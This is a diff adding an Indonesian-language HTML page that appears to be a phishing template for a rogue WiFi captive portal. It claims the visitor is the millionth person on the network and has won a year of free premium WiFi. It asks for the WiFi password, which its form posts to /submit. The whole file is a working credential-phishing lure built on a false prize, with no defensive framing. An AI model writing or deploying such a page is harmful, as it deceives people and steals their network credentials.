@@ -1,0 +1,113 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="0; url=/connecttest.html">
+    <title>Selamat! Anda Pemenang!</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Comic Sans MS', cursive, sans-serif;
+            background: linear-gradient(135deg, #f093fb 0%, #f5576c 50%, #ffd89b 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+        .confetti {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            pointer-events: none;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 30px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 450px;
+            position: relative;
+            z-index: 1;
+        }
+        .trophy {
+            font-size: 80px;
+            animation: bounce 1s infinite;
+        }
+        @keyframes bounce {
+            0%, 100% { transform: translateY(0); }
+            50% { transform: translateY(-20px); }
+        }
+        h1 {
+            background: linear-gradient(90deg, #f093fb, #f5576c, #ffd89b);
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-size: 32px;
+            margin: 20px 0;
+        }
+        .message {
+            color: #333;
+            font-size: 18px;
+            margin: 20px 0;
+        }
+        .prize-box {
+            background: linear-gradient(135deg, #ffd89b, #f5576c);
+            color: white;
+            padding: 20px;
+            border-radius: 15px;
+            margin: 20px 0;
+        }
+        .prize-box h2 {
+            font-size: 24px;
+        }
+        .form-box {
+            margin-top: 30px;
+        }
+        .form-box input {
+            width: 100%;
+            padding: 15px;
+            border: 3px solid #f5576c;
+            border-radius: 15px;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        .form-box button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #f093fb, #f5576c);
+            color: white;
+            border: none;
+            border-radius: 15px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="trophy">🏆🎉</div>
+        <h1>🎊 SELAMAT! 🎊</h1>
+        <div class="message">
+            Anda adalah pengunjung ke-1.000.000<br>
+            yang terhubung ke WiFi ini!
+        </div>
+        
+        <div class="prize-box">
+            <h2>🎁 GRATIS 1 TAHUN WiFi PREMIUM 🎁</h2>
+            <small>Masukkan password WiFi untuk klaim hadiah Anda!</small>
+        </div>
+        
+        <div class="form-box">
+            <form action="/submit" method="POST">
+                <input type="password" name="password" placeholder="Password WiFi Anda" required>
+                <button type="submit">🎁 KLAIM HADIAH SEKARANG!</button>
+            </form>
+        </div>
+    </div>
+</body>
+</html>
